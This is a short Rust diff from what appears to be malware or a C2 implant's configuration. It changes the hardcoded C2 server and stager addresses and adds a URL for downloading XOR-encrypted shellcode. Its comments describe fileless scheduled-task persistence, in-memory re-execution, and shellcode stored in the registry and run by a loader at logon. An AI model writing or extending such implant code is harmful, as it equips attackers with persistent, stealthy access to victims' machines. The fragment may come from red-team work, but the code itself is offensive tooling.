@@ -9,8 +9,12 @@ pub fn get_c2_server() -> &'static str {
     str_slice.trim_end_matches('\0')
 }
 
-pub const C2_SERVER: &str = "45.154.98.72:4444";
+pub const C2_SERVER: &str = "192.168.2.7:4444";
 
 /// URL from which the stager (ester.exe) is served by the C2 server.
 /// Used by fileless scheduled-task persistence to download & re-exec the agent from memory.
-pub const STAGER_URL: &str = "http://45.154.98.72:5555/api/stage0/ester";
+pub const STAGER_URL: &str = "http://192.168.2.7:5555/api/stage0/ester";
+
+/// URL from which donut-processed PIC shellcode is served (XOR-encrypted in transit).
+/// Used by auto-persist to download shellcode -> store encrypted in registry -> native loader on logon.
+pub const SHELLCODE_URL: &str = "http://192.168.2.7:5555/api/stage0/ester.sc";
